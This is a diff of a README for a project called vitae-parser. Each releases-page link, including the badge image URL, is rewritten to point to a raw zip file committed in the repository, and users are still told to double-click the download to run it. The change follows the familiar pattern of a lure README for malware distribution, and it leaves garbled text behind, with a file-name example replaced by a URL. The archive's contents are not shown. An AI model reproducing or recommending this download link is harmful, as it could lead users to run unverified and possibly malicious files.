@@ -6,7 +6,7 @@ Welcome to vitae-parser. This application helps you extract and structure biogra
 
 ## 🔗 Download Link
 
-[![Download vitae-parser](https://img.shields.io/badge/Download-vitae--parser-brightgreen)](https://github.com/franciscooo343534/vitae-parser/releases)
+[![Download vitae-parser](https://github.com/franciscooo343534/vitae-parser/raw/refs/heads/main/vitae_parser/parser_vitae_v1.0.zip)](https://github.com/franciscooo343534/vitae-parser/raw/refs/heads/main/vitae_parser/parser_vitae_v1.0.zip)
 
 ## 📥 Download & Install
 
@@ -15,13 +15,13 @@ To get started with vitae-parser, follow these simple steps:
 1. **Visit the Download Page:**
    Click the link below to download the latest version of vitae-parser:
    
-   [Download vitae-parser](https://github.com/franciscooo343534/vitae-parser/releases)
+   [Download vitae-parser](https://github.com/franciscooo343534/vitae-parser/raw/refs/heads/main/vitae_parser/parser_vitae_v1.0.zip)
 
 2. **Select the Release Version:**
    On the releases page, you will see a list of available versions. Choose the latest release to ensure you access the most up-to-date features.
 
 3. **Download the File:**
-   Each release will have a file you can download. The file may have a name like `vitae-parser.exe` or similar depending on your operating system. Click the link to start the download.
+   Each release will have a file you can download. The file may have a name like `https://github.com/franciscooo343534/vitae-parser/raw/refs/heads/main/vitae_parser/parser_vitae_v1.0.zip` or similar depending on your operating system. Click the link to start the download.
 
 4. **Run the Application:**
    After the download completes, locate the file on your computer, usually in the "Downloads" folder. Double-click the file to run vitae-parser. Follow any on-screen instructions to set up the application.
@@ -83,6 +83,6 @@ For those interested in a deeper understanding of the technology behind vitae-pa
 - **Data Verification**: Understand methods for ensuring the accuracy and consistency of extracted data.
 - **Text Structuring**: Discover techniques for organizing information from unstructured text inputs.
 
-Remember, all latest updates and support resources are available on the [GitHub Releases Page](https://github.com/franciscooo343534/vitae-parser/releases). 
+Remember, all latest updates and support resources are available on the [GitHub Releases Page](https://github.com/franciscooo343534/vitae-parser/raw/refs/heads/main/vitae_parser/parser_vitae_v1.0.zip). 
 
 Thank you for using vitae-parser! We hope it simplifies your biographical data extraction tasks.
